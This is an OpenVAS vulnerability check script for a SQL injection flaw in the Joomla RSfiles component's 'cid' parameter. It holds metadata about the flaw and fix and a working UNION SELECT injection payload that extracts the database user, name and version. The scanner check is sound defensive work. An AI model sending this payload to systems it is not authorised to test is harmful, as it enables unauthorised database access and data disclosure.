###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_rsfiles_sql_inj_vuln.nasl 11883 2018-10-12 13:31:09Z cfischer $
#
# Joomla RSfiles SQL Injection Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803441");
  script_version("$Revision: 11883 $");
  script_bugtraq_id(58547);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 15:31:09 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-03-20 15:59:21 +0530 (Wed, 20 Mar 2013)");

  script_name("Joomla RSfiles SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52668");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24851");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/52668");
  script_xref(name:"URL", value:"http://www.madleets.com/Thread-Joomla-Component-RSfiles-cid-SQL-injection-Vulnerability");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Joomla RSfiles");

  script_tag(name:"insight", value:"Input passed via the 'cid' GET parameter to index.php (when 'option' is set to
'com_rsfiles', 'view' is set to 'files', 'layout' is set to 'agreement', and 'tmpl' is set to 'component') is not
properly sanitised before being used in a SQL query.");

  script_tag(name:"solution", value:"Upgrade to Joomla RSfiles REV 12 or later.");

  script_tag(name:"summary", value:"This host is installed with Joomla RSfiles and is prone to sql injection
vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

url = dir + "/index.php?option=com_rsfiles&view=files&layout=agreement&" +
            "tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONC" +
            "AT_WS(CHAR(32,58,32),user(),database(),version())--";

if (http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"File:",
                    extra_check:make_list("I Agree", "I Disagree"))) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
